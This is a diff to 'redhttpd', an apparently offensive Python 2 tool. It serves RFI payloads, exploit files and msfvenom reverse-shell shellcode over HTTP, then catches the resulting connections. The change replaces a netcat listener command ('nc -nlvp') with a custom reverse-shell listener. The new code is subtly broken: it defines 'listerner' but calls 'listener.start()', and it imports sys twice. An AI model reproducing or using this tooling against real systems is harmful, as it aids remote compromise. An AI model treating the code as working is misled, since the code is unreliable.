@@ -4,11 +4,14 @@ import SimpleHTTPServer
 import SocketServer
 import os
 import sys
+from thread import *
+import sys
 import glob
 import argparse
 import shutil
 from argparse import RawTextHelpFormatter
 import subprocess
+from simplelistener import SimpleListener
 
 VERSION_MAJOR="0"
 VERSION_MINOR="2b"
@@ -60,7 +63,7 @@ def parse_args():
 
 	group = parser.add_mutually_exclusive_group(required=True)
 
-	group.add_argument("-y", "--yolo", nargs="?", choices=YOLO_PAYLOAD_LIST, const=YOLO_PAYLOAD, help="YOLO mode. Copy custom payloads from the corresponding '{0}' directory to root directory. Use it to serve one request and shutdown. Useful when chained with netcat listening on the same port. Warning: With this option on, -p/--port value will always be used even if LPORT is set. E.g.: {1} -p 53 -y".format(YOLO_DIR, sys.argv[0]))
+	group.add_argument("-y", "--yolo", nargs="?", choices=YOLO_PAYLOAD_LIST, const=YOLO_PAYLOAD, help="YOLO mode. Copy custom payloads from the corresponding '{0}' directory to root directory. Use it to serve one request and shutdown. Useful when chained with a reverse shell listener, listening on the same port. Warning: With this option on, -p/--port value will always be used even if LPORT is set. E.g.: {1} -p 53 -y".format(YOLO_DIR, sys.argv[0]))
 	group.add_argument("-r", "--rfi", nargs="?", choices=RFI_TYPES, const=RFI_TYPE, help="RFI mode. Copy custom RFI payload from corresponding '{0}' directory to root directory. Default: {1}. Use with -e/--extension argument to remove or change file extension.".format(RFI_DIR, RFI_TYPE))
 	group.add_argument("-x", "--exploits", nargs="?", choices=EXPLOITS_TARGETS, const=EXPLOITS_DEFAULT, help="Exploits mode. Copy custom exploits from the corresponding '{0}' directory to root directory. The default value is: linux.".format(EXPLOITS_DIR))
 	group.add_argument("-m", "--msf-shell", nargs="?", help="msfvenom mode. Use msfvenom to create a shellcode and serve it. Use it just like msfvenom without LHOST, LPORT and -o parameters. E.g.: {0} -m \" -p linux/x86/shell_reverse_tcp -f elf\" --LHOST 192.168.0.1 --LPORT 53. (msfvenom required)".format(sys.argv[0]))
@@ -74,7 +77,7 @@ def parse_args():
 	parser.add_argument("--LHOST", default="127.0.0.1", help="Use to substitute host placeholder.")
 	parser.add_argument("--LPORT", type=int, help="Use to substitute port placeholder.")
 
-	parser.add_argument("--no-netcat", action="store_true", help="Disables default netcat used in YOLO mode. By default, in YOLO mode, a netcat listerner starts after httpd handler is closed, on the same port redhttpd was running. (netcat required)")
+	parser.add_argument("--no-listener", action="store_true", help="Disables default reverse shell listener used in YOLO mode. By default, in YOLO mode, the listerner starts after httpd handler is closed, on the same port redhttpd was running.")
 
 	return parser.parse_args()
 
@@ -181,7 +184,6 @@ def main():
 	handler.server_version = "redhttpd/{0}.{1}".format(VERSION_MAJOR, VERSION_MINOR)
 	handler.sys_version = ""
 	SocketServer.TCPServer.allow_reuse_address=True
-	httpd = SocketServer.TCPServer((args.binding_address, args.port), handler)
 
 	try:
 		vprint("redhttpd bind to {0}:{1}".format(args.binding_address, args.port))
@@ -192,8 +194,18 @@ def main():
 		vprint("")
 
 		if args.yolo:
-			httpd.handle_request()
+			while True:
+				vprint("Now on HTTPD mode", 2)
+				httpd = SocketServer.TCPServer((args.binding_address, args.port), handler)
+				httpd.handle_request()
+				httpd.server_close()
+				if args.yolo and not args.no_listener:
+					vprint("Now on SIMPLELISTENER mode", 2)
+					listerner = SimpleListener(args.binding_address, args.port)
+					listener.start()
+
 		else:
+			httpd = SocketServer.TCPServer((args.binding_address, args.port), handler)
 			httpd.serve_forever()
 
 	except KeyboardInterrupt:
@@ -202,16 +214,9 @@ def main():
 	finally:
 		httpd.server_close()
 
-		if args.yolo and not args.no_netcat:
-			try:
-				subprocess.call(["nc", "-nlvp", str(args.port)]);
-			except:
-				pass
-
 		for filename in file_list:
 			if os.path.isfile(filename):
 				os.remove(filename)
-
 
 args = None
 if __name__ == "__main__":
